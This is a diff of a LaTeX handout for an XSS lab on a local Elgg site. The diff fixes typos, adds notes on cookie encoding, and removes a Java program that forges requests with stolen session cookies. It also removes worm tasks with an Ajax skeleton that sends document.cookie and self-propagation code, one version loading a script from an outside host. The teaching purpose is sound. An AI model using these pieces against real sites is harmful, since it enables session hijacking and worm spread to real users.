@@ -76,7 +76,7 @@ Some of the lab tasks require some basic familiarity with
 JavaScript. Wherever necessary, we provide a sample JavaScript program
 to help the students get started. To complete task 3, students may
 need a utility to watch incoming requests on a particular TCP port. The
-home directory on the attacher computer contains an "echoserver" directory having
+home directory on the attacker computer contains an "echoserver" directory having
 C program that can be configured to listen on a particular
 port and display incoming messages. 
 
@@ -161,7 +161,8 @@ machine. The
 JavaScript given below sends the cookies to the port 5555 of the
 attacker's machine, where the attacker has a TCP server listening 
 to the same port. The server can print out whatever it receives. 
-The TCP server program is in the echoserver directory on the attacher computer.
+The TCP server program is in the echoserver directory on the attacker computer.
+Note that in the output, the {\tt =} character gets transformed to {\tt \%3D}.
 
 {\footnotesize
 \begin{Verbatim}[frame=single] 
@@ -170,7 +171,6 @@ The TCP server program is in the echoserver directory on the attacher computer.
  </script> 
 \end{Verbatim}
 }
-
 
 \subsection{Task 4: Session Hijacking using the Stolen Cookies}
 
@@ -201,7 +201,7 @@ the request is sent out by the victim's browser or by the attacker's
 Java program. As long as we set all the parameters correctly,
 and the session cookie is attached, the server will accept and process the 
 project-posting HTTP request.
-To simplify your task, the HTTPSimpleForge directory on the attacher computer
+To simplify your task, the HTTPSimpleForge directory on the attacker computer
 contains a sample Java program that does the 
 following:
 
@@ -212,88 +212,12 @@ following:
 \item Get the response from web server. 
 \end{enumerate}
 
-{\footnotesize
-\begin{Verbatim}[frame=single]
-import java.io.*;
-import java.net.*;
+Note you are permitted to hand-code cookie values (obtained using
+the technique in Task 3) into this program.  In practice, such
+a program would read the cookie value off of the network as was
+done in Task 3.
 
-
-public class HTTPSimpleForge {
-
-public static void main(String[] args) throws IOException {
-
-try {
-     int responseCode;
-     InputStream responseIn=null; 
-
-     String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>
-                              &__elgg_token=<<correct_elgg_token_value>>";
-
-	 // URL to be forged.
-	 URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?
-	                      friend=<<friend_user_guid>>"+requestDetails);
-
-	 // URLConnection instance is created to further parameterize a
-	 // resource request past what the state members of URL instance
-	 // can represent.
-	 HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
-	 if (urlConn instanceof HttpURLConnection) {
-	 urlConn.setConnectTimeout(60000);
-	 urlConn.setReadTimeout(90000);
-	 }
-
-	 // addRequestProperty method is used to add HTTP Header Information.
-	 // Here we add User-Agent HTTP header to the forged HTTP packet.
-	 // Add other necessary HTTP Headers yourself. Cookies should be stolen
-	 // using the method in task3.
-	 urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
-
-	 //HTTP Post Data which includes the information to be sent to the server.
-	 String data = "name=...&guid=..";
-
-	 // DoOutput flag of URL Connection should be set to true
-	 // to send HTTP POST message.
-	 urlConn.setDoOutput(true);
-
-	 // OutputStreamWriter is used to write the HTTP POST data
-	 // to the url connection.
-	 OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
-	 wr.write(data);
-	 wr.flush();
-	 
-	 // HttpURLConnection a subclass of URLConnection is returned by
-	 // url.openConnection() since the url is an http request.
-	 if (urlConn instanceof HttpURLConnection) {
-	    HttpURLConnection httpConn = (HttpURLConnection) urlConn;
-	 
-	    // Contacts the web server and gets the status code from
-  	    // HTTP Response message.
-	    responseCode = httpConn.getResponseCode();
-	    System.out.println("Response Code = " + responseCode);
-	 
-	    // HTTP status code HTTP_OK means the response was
-	    // received sucessfully.
-	    if (responseCode == HttpURLConnection.HTTP_OK)
-	      // Get the input stream from url connection object.
-	      responseIn = urlConn.getInputStream();
-	    // Create an instance for BufferedReader
-	    // to read the response line by line.
-	    BufferedReader buf_inp = new BufferedReader(
-	    new InputStreamReader(responseIn));
-	    String inputLine;
-	    while((inputLine = buf_inp.readLine())!=null) {
-	       System.out.println(inputLine);
-            }
-	 }
-   } catch (MalformedURLException e) {
-        e.printStackTrace();
-   }
-}
-}
-\end{Verbatim}
-}
-
-If you have trouble understanding the above program, 
+If you have trouble understanding the sample Java program, 
 we suggest you to read the following:
 
 \begin{itemize}
@@ -315,188 +239,7 @@ java HTTPSimpleForge
 \end{Verbatim}
 
 
-\subsection{Task 5: Writing an XSS Worm}
-
-In this and next task, we will perform an attack similar to what Samy did 
-to MySpace in 2005 (i.e. the Samy Worm). First, we will write an XSS 
-worm that does not self-propagate; in the next task, we will make it 
-self-propagating.
-From the previous task, we have learned how to steal the cookies from the victim 
-and then forge---from the attacker's machine---HTTP requests using the stolen cookies.
-In this task, we need to write a malicious JavaScript program that forges HTTP requests 
-directly from the victim's browser, without the intervention of 
-the attacker.  The objective of the attack is to modify the victim's 
-profile and add Samy as a friend to the victim. We have already created a
-user called Samy on the {\tt Elgg} server (the user name is {\tt samy}).
-
-
-\paragraph{Guideline 1: Using Ajax.} The malicious JavaScript should be able to 
-send an HTTP request to the {\tt Elgg} server, asking it to modify
-the current user's profile. There are two common types of HTTP requests, 
-one is HTTP {\tt GET} request,
-and the other is HTTP {\tt POST} request. These two types of HTTP requests
-differ in how they send the contents of the request to the server. 
-In {\tt Elgg}, the request for modifying profile uses HTTP {\tt POST}
-request. We can use the {\tt XMLHttpRequest} object to send 
-HTTP {\tt GET} and {\tt POST} requests to web applications. 
-
-To learn how to use {\tt XMLHttpRequest}, you can 
-study these cited documents~\cite{ajaxnoobs,ajaxpostit}. 
-If you are not familiar with JavaScript programming, we 
-suggest that you read ~\cite{javascripttutorial} to learn some basic JavaScript
-functions. You will have to use some of these functions.
-
-
-\paragraph{Guideline 2: Code Skeleton.} We provide a skeleton of the JavaScript code 
-that you need to write. You need to fill in all the necessary details.
-When you store the final JavaScript code as a worm in the standalone file,
-you need to remove all the comments, extra space, new-line characters, {\tt <script>}
-and {\tt </script>}.
-
-{\footnotesize
-\begin{Verbatim}[frame=single] 
-<script>
-var Ajax=null;
-
-// Construct the header information for the HTTP request
-Ajax=new XMLHttpRequest();
-Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
-Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-Ajax.setRequestHeader("Keep-Alive","300");
-Ajax.setRequestHeader("Connection","keep-alive");
-Ajax.setRequestHeader("Cookie",document.cookie);
-Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-
-// Construct the content. The format of the content can be learned
-// from LiveHTTPHeaders.
-var content="name=..&description=...&guid="; // You need to fill in the
-details.
-
-// Send the HTTP POST request.
-Ajax.send(content);
-</script>
-\end{Verbatim} 
-} 
-
-
-You may also need to debug your JavaScript code. 
-In Firefox, select the "Developer" option from the menu (upper right),
-and use the console and debugger to debug your script.
-After finishing this task, change the "Content-Type" to "multipart/form-data" 
-as in the original HTTP request. Repeat your attack, and describe your observation. 
-
-
-\paragraph{Guideline 3: Getting the user details.} To modify the victim’s profile the
-HTTP requests send from the worm should contain the victim’s {\tt username},
-{\tt Guid}, {\tt \_\_elgg\_ts} and {\tt \_\_elgg\_token}. These details are present in the web page
-and the worm needs to find out this information using JavaScript code.
-
-
-
-\paragraph{Guideline 4: Be careful when dealing with an infected profile.}
-Sometimes, a profile is already infected by the XSS worm, you may want to
-leave them alone, instead of modifying them again. If you are not careful, 
-you may end up removing the XSS worm from the profile. 
-
-
-%\paragraph{Guideline 5: Testing.}
-%For {\tt Elgg}, you can view others' profiles only if you are the administrator or you are 
-%assigned to the same project. Test your attack under the following steps:
-%
-%\begin{enumerate}
-%   \item Add a new project in {\tt Elgg}. Assign it to at least three persons. 
-%   \item Choose one of them as the attacker and include the worm into his or her profile. 
-%   \item Log on as victim A, view attacker's profile. Check if A's profile is infected. This is 
-%to test if the HTTP request succeeds.
-%   \item Log on as victim B, view A's profile. Check if B's profile is injected. This is to test
-%if the worm can propagate itself.
-%\end{enumerate}
-
-
-
-\subsection{Task 6: Writing a Self-Propagating XSS Worm}
-
-To become a real worm, the malicious JavaScript program should be able to propagate itself.
-Namely, whenever some people view an infected profile, 
-not only will their profiles be modified, the worm will also be 
-propagated to their profiles, further affecting others who view these newly infected profiles.
-This way, the more people view the infected profiles, the faster the worm can propagate. 
-This is exactly the same mechanism used by the Samy Worm: 
-within just 20 hours of its October 4, 2005 release, over one million users 
-were affected, making Samy one of the fastest spreading viruses of all time.
-The JavaScript code that can achieve this is called 
-a {\em self-propagating cross-site scripting worm}. In this task, you need to 
-implement such a worm, which infects the victim's profile and adds the user
-``Samy'' as a friend.
-
-To achieve self-propagation, when the malicious JavaScript modifies the victim's profile,
-it should copy itself to the victim's profile. There are several 
-approaches to achieve this, and we will discuss two common approaches:
-
-\begin{itemize}
-\item {\bf ID Approach:} If the entire JavaScript program (i.e., the worm) is 
-    embedded in the infected profile, 
-    to propagate the worm to another profile, the worm code can use
-    DOM APIs to retrieve a copy of itself from the web page.
-    An example of using DOM APIs is given below. This code
-    gets a copy of itself, and display it in an alert window:
-
-{\footnotesize
-\begin{Verbatim}[frame=single]
-<script id=worm>
-   var strCode = document.getElementById("worm");
-   alert(strCode.innerHTML);
-</script>
-\end{Verbatim}
-}
-
-\item {\bf Src Approach:} If the worm is included using the {\tt src} attribute in the {\tt <script>} tag,
-writing self-propagating worms is much easier. 
-We have discussed the {\tt src} attribute in Task 1, and an example
-is giving below. The worm can simply copy the following
-{\tt <script>} tag to the victim's profile, essentially
-infecting the profile with the same worm.
-
-\begin{Verbatim}
-<script type="text/javascript" src="http://example.com/xss_worm.js">
-</script>
-\end{Verbatim} 
-
-\end{itemize}
-
-\paragraph{Note:} In this lab, you can try both approaches, 
-but the ID approach is required, because it is more 
-challenging and it does not rely on external JavaScript code.
-
- 
-\paragraph{Guideline: URL Encoding.}
-All messages transmitted using HTTP over the Internet use URL Encoding, 
-which converts all non-ASCII characters such as space to special code 
-under the URL encoding scheme. 
-In the worm code, messages sent to {\tt Elgg} 
-should be encoded using URL encoding. The \texttt{escape} function
-can be used to URL encode a string. An example of using the encode
-function is given below.
-
-{\footnotesize
-\begin{Verbatim}[frame=single]
-<script>
-  var strSample = "Hello World";
-  var urlEncSample = escape(strSample);
-  alert(urlEncSample);
-</script>
-\end{Verbatim}
-}
-
-Under the URL encoding scheme 
-the "+" symbol is used to denote space. In JavaScript programs, 
-"+" is used for both arithmetic operations and string operations. 
-To avoid this ambiguity, you may use the {\tt concat} function for string concatenation,
-and avoid using addition. For the worm code in the exercise, you don't have to use additions.
-If you do have to add a number (e.g a+5), you can use subtraction (e.g a-(-5)).
-
-
-\subsection{Task 7: Countermeasures}
+\subsection{Task 5: Countermeasures}
 
 {\tt Elgg} does have a built in countermeasures to defend against the XSS attack.
 We have deactivated and commented out the countermeasures to make the
